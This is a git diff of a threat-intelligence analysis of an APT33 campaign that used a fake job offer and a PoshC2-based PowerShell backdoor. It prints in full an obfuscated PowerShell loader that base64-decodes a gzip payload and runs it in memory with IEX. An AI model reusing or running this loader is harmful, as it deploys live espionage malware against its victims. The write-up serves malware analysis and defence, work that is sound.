@@ -7,7 +7,7 @@
 * [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
 * [Knowledge Graph](#Knowledge)
 * [Links](#Links)
-  + [Originals Tweets](#Original-Tweet)
+  + [Original Tweet](#tweet)
   + [Link Anyrun](#Links-Anyrun)
   + [Ressources](#Ressources)
 
@@ -20,7 +20,9 @@ Firstly, we can confirm that an VBE file by the magic number sequence ```23 40 7
 <h6> Once decoded, we can observed the first layer of the powershell script, this use a common series of techniques for obfuscate the payload. This decode in base 64 a stream of a zip file, extract it in the memory and execute the code still in memory.</h6>
 
 ``` powershell
+
 powershell /w 1 IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIAJ0RyV0C/51WW3PaOhB+96/QePyAWyxugbRheCAOadKEhAM0nTaTOSPsBVSM5cpyCOHw38/KNpekTdJzMnlAq719u592fTtYxgrm9AoUHYC85x70BA9Vl4VsAvLu6EhLQbogFR9zjym4YQH3meIidFkQjJg3Iy2yspRMYG1Ysdcyp0pF8VGpVK3UaLV6SCv1Oq3Wjw4OaiYqvHZfGrERBE4kguWYB0GpQWu0clAyjXESejokcdtdUrBmsCxa5zf2ylByicEZpnAFC+d69AM8Rcwc1QC8RHK1pK5cRkpMJIumS9rnP0KfQZBh9E1jTRCXN/2vftoQZ+dN4aS45z5IE8vAaFf4gN5uX3Xh8mgKUqtipd1jVxv2mO/zcPKmba6XG38HKWJtfhwIbzbgjzp4pfpBiy5gmQuq9YbBx1hArJ2x2vykE1DDZQQFm16xORAHfiJ0JdG7iWro4fxmLx1XhMgIhUFPpZgfsxgaB5l26ndtQBDDzgxla2OdxcK+bePi77cDY+p/GFm73gudGWqpDm6x9Y5CnSt3Q6EkRApZo70QQ3hQtBN6QtcWA30Znn6gn0AdLxXEBW1gpCzRPNQ+DEvXFQO6EvBxoGXaI1lAvbG+ATqULIzHQs5PeciCtD8Fa1Qk5SKxRvQSwoma2sbtCCPc3t0RK8ocYvHeE2ts/Ap+KJ5Cj2xjD95JZwsPQu85vtdKqNUNK2va6LZM8WHePUWrm2lY/j7iE9hDnOgb/0XElcYeZOLg2TbeKvwmucTew4hy5yuMvIBDqBCtK8SMg01WWXIFfX+CyRHnFLNg+JJ9v9Ttlpb4Z9rNTOsWpxgoPtfPp8dkDJ0H5qmC5Rf3tYtWmASBtpm9bGNWqiX8r5YrH83fW2eUJ06gsECYKDxwhbxMYpChpn6LmDgcIxbHCyH9zVGKh2Uig/y48J6Op73ZjcVw02I0DcOatlA7DYhFZqFPCsiRGNseY+0UGwVA3cv+TXamXfZDSOJMFKnaNmaGYegZMBxkMW37fsE8E7FCINP8efEx+rVXOOklj9TR3jy39MVLI7y5NfCeWeh5+TzmF6yL054gIKxnVzyiJ1aq0zIpfOWhLxYxuRqSSpmWmwQFjYMmeWgc2KQdRQFgLS64KtVrh7TWIIWLs2H3skgCPgPkjTcTNnGnyH0oHTZomdY+lD/SSrlMBmzMJM/NcPz8klMfxiBxvBdNvE3Lu+lPSrxF9Fp3elp1Z1FM9+WGF1sWpN3asiB12xsM9APMnu1QOOkygOxV7FSJ0457AeOhfkYp6z1AyuJ89ST4MXoIMTORZRZnmc3T/TfHGlOWKDFPdzrtDfBd+yjkLCDbzIo6j6YGSXfX2u02RBPXqKYHWRFdOWzgCYxZEqhn+hp3k2QtT4uihYsIRbm58bb5zvh5Nijfk+ic0gJ7m/lAnnf1dq9NZ8jKPvxMIFaZil7KqWUR1xLE+rmcn7TyaWPaGQqyN5ciiaNBagxe8rsF3sOueTxiAc1pfJ6mqpYYCWeWm0iJZz1JX2DTy562AkSb6CU1+aMEjhMeqPOwLwI90tr+nIc8VpLhQM+4iR0/jzOFAjq18eVD0DLfmWvdruyALxi/w1ZW0kqDU82Y93iTf1itUkcQ3h/tiK43vZUJPTGPEpVd2JZpr3LPSeuJzRqrLVrmVuYjY3nYtJLmL14ySa9/7XYGg+v+3+2+e3Y+7LjDL/1O04q433ztEzX7pIyiFu5D4uitd1iNP8/mwfzg0/fltwU8fvs5a/SHl8n08bOML+4rlb8uknq7Ep4OvRZxkpBYYvdNiY7MTr9/3ddzLidIvqJ2K8zJOIUPOrIp9iUMBPPjfPXF2E5NBx/+Vz4aRh44H1u4hvQ0NN+hs3emnvnRP4TDg/5UStFn2lsMa2OgmFTOIACISK1c/gOtxota/wJs3EOYdAwAAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+
 ```
 
 <h6>On the second layer, we can see multiple bloc of fuctions and variables. The first bloc content the parameters like IP, the validation for check the validity of the certificate and URL</h6>
@@ -147,8 +149,26 @@ try {main} catch {}
 Start-Sleep 600
 try {main} catch {}
 ```
-
-
+<h6>The first time give the fake job to the victim, if the victim is interesting for APT33, this deploy the next stage else perform an invalid content who are catched and don't show something on the screen.</h6>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Site-2.png">
+</p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/CyberThreatIntel/blob/master/Iran/APT/APT33/16-11-19/Analysis/Site-1.png">
+</p>
+<h6> The fake page redirect by submit buttom to a real job proposed by the same company DynCorp International. An american global service provider. Started as an aviation company, the company also provides flight operations support, training and mentoring, international development, intelligence training and support, contingency operations, security, and operations and maintenance of land vehicles.</h6>
+<h2>Threat Intelligence</h2><a name="Intel"></a></h2>
+<h6> The second layer of the powershell backdoor is edited from an open source framework POSHC2 (cf. ressource link). Compared to Muddywater, APT33 have gone to the open source framework probably for financial resson and better payload abilities. </h6><h6>According to Symantec analysis this used the same TTPs with POSHC2 payload sice the last months. </h6>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Info-2.PN">
+</p>
+G
+<h6> APT33 have since get an watch out for new open-source tools that can be used in their operations. By example, APT33 have been used in the new exploit on winrar archive found by Checkpoint for the campagn of February 2019.</h6>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Iran/APT/APT33/16-11-19/Analysis/Info-1.PNG">
+  
+</p>
+<h6></h6>
 <h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
 <h6> List of all the Indicators Of Compromise (IOC)</h6>
 <h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>
@@ -160,10 +180,12 @@ try {main} catch {}
 
 <h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
 
-* [6850189bbf5191a76761ab20f7c630ef.xls](https://app.any.run/tasks/27ea35e6-6211-468d-9b8a-8c4cf22764ce)
+* [JobDescription.vbe](https://app.any.run/tasks/c4630121-3967-451f-b238-7624d07f7319)
 * [AramCoJobs.hta](https://app.any.run/tasks/124bd8cf-4a93-4e39-94c2-fa7790706260)
 
 <h6> Ressources : </h6><a name="Ressources"></a>
 
+* [Lab52 analysis on the APT33 group](https://lab52.io/blog/geopolitical-strategy-of-iran-and-the-cyberattacks-of-apt33/)
 * [Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
 * [APT33 PowerShell Malware](https://norfolkinfosec.com/apt33-powershell-malware/)
+* [Github PoshC2](https://github.com/nettitude/PoshC2/blob/8a7b928f9dd5e0778c19b2a8e7fb6b1e4c218820/Files/dropper.ps1)
